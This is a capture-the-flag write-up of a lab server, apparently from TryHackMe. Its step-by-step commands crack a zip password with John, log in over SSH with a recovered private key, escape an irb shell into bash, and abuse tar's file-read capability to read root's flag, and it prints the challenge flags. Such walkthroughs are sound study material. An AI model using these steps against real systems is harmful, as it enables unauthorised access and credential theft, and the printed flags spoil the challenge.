# The Server From Hell

Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?

Start at port 1337 and enumerate your way.

Good luck.

# flag.txt

## Port 1337

As instructed, let's start with port 1337. Connecting to this port gives a hint:

~~~
┌──(kali㉿kali)-[/data/vpn]
└─$ nc 10.10.85.25 1337
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
~~~

## First 100 port

Let's use a simple bash command to display the output when connecting to the first 100 ports. It makes the below ASCII art with a lot of junk output from fake commands:

~~~
┌──(kali㉿kali)-[/data/vpn]
└─$ for i in {1..100};do nc 10.10.85.25 $i;echo "";done
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
550 12345 0fffffffff70000088800888800088888800008800007ffffffff00
550 12345 0fffffffff000088808880000000000000088800000008fffffff00
550 12345 0ffffffff80008808880000000880000008880088800008ffffff00
550 12345 0ffffffff000000888000000000800000080000008800007fffff00
550 12345 0fffffff8000000000008888000000000080000000000007fffff00
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00 <--------- interesting!
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
����Grandstream GXVd( Boot:HMda  Loader:wzYUBO  App:OeigdB  HW: BWsw ) Command Shell
Password: 

220 KMiSG ESMTP
214-The following commands are recognized
214-	auth	data	ehlo	euq_full
214-	helo	help	mail	noop
214 	quit	rcpt	rset	vrfy


[REDACTED]


HTTP/1.0 200 OK
Server: IP_SHARER WEB jO-OiffR
h<meta name="description" content="Belkin 1">

������!����
*+
* +*
*   The Gemini Project   *
* +*
*+

OpenDreambox Xlc qr
~~~

The interesting information is given by port 21. It instructs us to connect to port 12345.

~~~
┌──(kali㉿kali)-[/data/vpn]
└─$ nc 10.10.85.25 21
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
~~~

## Port 12345

Connecting to port 12345 gives another hint about the presence of NFS.

~~~
┌──(kali㉿kali)-[/data/vpn]
└─$ nc 10.10.85.25 12345
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
~~~

Let's confirmation with a scan on ports 111 and 2049:

~~~
┌──(kali㉿kali)-[/data/The_Server_From_Hell]
└─$ nmap -sC -sV -p111,2049 10.10.85.25                                                                      255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-05 08:08 CEST
Nmap scan report for 10.10.85.25
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      45669/tcp   mountd
|   100005  1,2,3      54813/tcp6  mountd
|   100005  1,2,3      56633/udp   mountd
|   100005  1,2,3      59800/udp6  mountd
|   100021  1,3,4      33261/udp   nlockmgr
|   100021  1,3,4      37817/tcp6  nlockmgr
|   100021  1,3,4      43006/udp6  nlockmgr
|   100021  1,3,4      46809/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
~~~

## NFS share

Indeed, there is a NFS share, which exposes a `backup.zip` file.

~~~
┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ mkdir nfs  
                                                                                                                      
┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ sudo mount -t nfs 10.10.85.25: nfs           
                                                                                                                      
┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ tree nfs
nfs
└── home
    └── nfs
        └── backup.zip
~~~

## Backup archive

This archive contains several files that have been taken from `/home/hades/.ssh/`, and is password protected.

~~~
┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ zipinfo backup.zip 
Archive:  backup.zip
Zip file size: 4534 bytes, number of entries: 6
drwx------  3.0 unx        0 bx stor 20-Sep-16 00:11 home/hades/.ssh/
-rw-------  3.0 unx     3369 TX defN 20-Sep-16 00:11 home/hades/.ssh/id_rsa
-rw-r--r--  3.0 unx       10 TX stor 20-Sep-16 00:11 home/hades/.ssh/hint.txt
-rw-r--r--  3.0 unx      736 TX defN 20-Sep-16 00:11 home/hades/.ssh/authorized_keys
-rw-r--r--  3.0 unx       33 TX stor 20-Sep-16 00:11 home/hades/.ssh/flag.txt
-rw-r--r--  3.0 unx      736 TX defN 20-Sep-16 00:11 home/hades/.ssh/id_rsa.pub
6 files, 4884 bytes uncompressed, 3318 bytes compressed:  32.1%

┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ unzip backup.zip 
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password:
~~~

Let's crack the password with John:

~~~
┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ /data/src/john/run/zip2john backup.zip > backup.hash              

┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ /data/src/john/run/john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)
1g 0:00:00:00 DONE (2021-05-05 08:28) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

## Flag

The flag is found in the `flag.txt` file of the uncompressed archive.

~~~
┌──(kali㉿kali)-[/data/…/files/home/hades/.ssh]
└─$ cat flag.txt         
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
~~~

Flag: `thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}`

# user.txt

*Hint: The fake ports aren't running real software...only the real one will respond to login attempts.*

## SSH

It seems that we are provided with `hades`' SSH private key (`home/hades/.ssh/id_rsa`). Moreover, there is a hint which seems to indicate a port range, likely to find the SSH service.

~~~
┌──(kali㉿kali)-[/data/…/files/home/hades/.ssh]
└─$ cat hint.txt 
2500-4500
~~~

Let's use Nmap to scan ports in this range and filter on ports containing `SSH`.

~~~
┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ nmap -sV -p 2500-4500 10.10.85.25 | grep -i ssh
2536/tcp open  ssh                    (protocol 615)
2543/tcp open  ssh                    Nand sshd hwW (protocol 2143693)
2562/tcp open  ssh                    FortiSSH (protocol 2.0)
2630/tcp open  ssh                    SCS sshd 3.5.2SSH (protocol 834410622)
2707/tcp open  ssh                    SSHTroll ssh honeypot (protocol 2438420)
2761/tcp open  ssh                    3Com switch sshd jgxNa (protocol 14228)
2765/tcp open  ssh                    (protocol 2.0)
2767/tcp open  ssh                    (protocol 83)
2875/tcp open  ssh                    SrSshServer ZKBo (sshlib Dw; protocol 97407)
2897/tcp open  ssh                    (protocol 2.0)
2966/tcp open  ssh                    (protocol 17611)
2968/tcp open  ssh                    libwrap'd OpenSSH (Access denied)
3066/tcp open  ssh                    WRQ Reflection for Secure IT sshd duabgq (OpenVMS MultiNet; protocol 623831517)
3079/tcp open  ssh                    (protocol 883)
3148/tcp open  ssh                    (protocol 326)
3207/tcp open  ssh                    (protocol 125669)
3333/tcp open  ssh                    OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3382/tcp open  ssh                    (protocol 83405642)
3385/tcp open  ssh                    (protocol 080789)
3532/tcp open  ssh                    (protocol 7106)
3647/tcp open  ssh                    Cisco IP Phone sshd (protocol 82)
3690/tcp open  ssh                    (protocol 409525)
3765/tcp open  ssh                    SSHTroll ssh honeypot (protocol 0677915)
3787/tcp open  ssh                    F-Secure sshd 35 (protocol 835)
3815/tcp open  ssh                    Bitvise WinSSHD MyBbLj (FlowSsh kvhaFR; protocol 8097785; non-commercial use)
3817/tcp open  sip-proxy              Comdasys SIP Server zOSsHY
3838/tcp open  ssh                    (protocol 903332409)
3898/tcp open  ssh                    Cisco CSS SSH (Unlicensed)
3941/tcp open  ssh                    (protocol 4622)
4045/tcp open  ssh                    (protocol 2435851)
4104/tcp open  ssh                    (protocol 737915)
4140/tcp open  ssh                    Cisco switch sshd (misconfigured)
4145/tcp open  ssh                    (protocol 60636)
4150/tcp open  ssh                    (protocol 57756)
4205/tcp open  ssh                    Bitvise WinSSHD Wc (FlowSsh kI; protocol 444896613; non-commercial use)
4232/tcp open  ssh                    (protocol 97)
4266/tcp open  ssh                    (protocol 10)
4297/tcp open  ssh                    (protocol 4762)
4331/tcp open  ssh                    Cisco switch sshd (misconfigured)
4468/tcp open  ssh                    (protocol 2.0)
~~~

Among all the banners sent by the ports pretending to run SSH, the most credible one is 3333. Let's give our key the appropriate privileges and use it to connect to this port:

~~~
┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ chmod 600 id_rsa                                                                                              2 ⚙
                                                                                                                      
┌──(kali㉿kali)-[/data/The_Server_From_Hell/files]
└─$ ssh -i id_rsa hades@10.10.85.25 -p 3333                                                                       2 ⚙
The authenticity of host '[10.10.85.25]:3333 ([10.10.85.25]:3333)' can't be established.
ECDSA key fingerprint is SHA256:xT5f2qKwN5vWrUVIEkkL92j1vcb/XjF9tIHoW/vyyx8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.85.25]:3333' (ECDSA) to the list of known hosts.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0> 
~~~

## Evade irb and user flag

We have an `irb` prompt (Interactive Ruby Shell). [GTFOBins](https://gtfobins.github.io/gtfobins/irb/) tells us that we can execute `/bin/bash`:

~~~
 irb(main):001:0> exec '/bin/bash'
hades@hell:~$ cat user.txt 
thm{sh3ll_3c4p3_15_v3ry_1337}
~~~

Flag: `thm{sh3ll_3c4p3_15_v3ry_1337}`

# root.txt

*Hint: getcap*

As the hint was `getcap`, I immediately ran the following command to get the capabilities:

~~~
hades@hell:/tmp$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
~~~

According to [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities), here is the meaning of these capabilities:

* `CAP_NET_RAW`: Use RAW and PACKET sockets (sniff traffic)
* `CAP_DAC_READ_SEARCH`: This only bypass file and directory read/execute permission checks

It means we can use `tar` to compress files owned by `root` and eventually, read the root flag:

~~~
hades@hell:/tmp$ tar -cvf flag.tar /root/root.txt
hades@hell:/tmp$ tar xf flag.tar 
hades@hell:/tmp$ cat root/root.txt 
thm{w0w_n1c3_3sc4l4t10n}
~~~

Root flag: `thm{w0w_n1c3_3sc4l4t10n}`
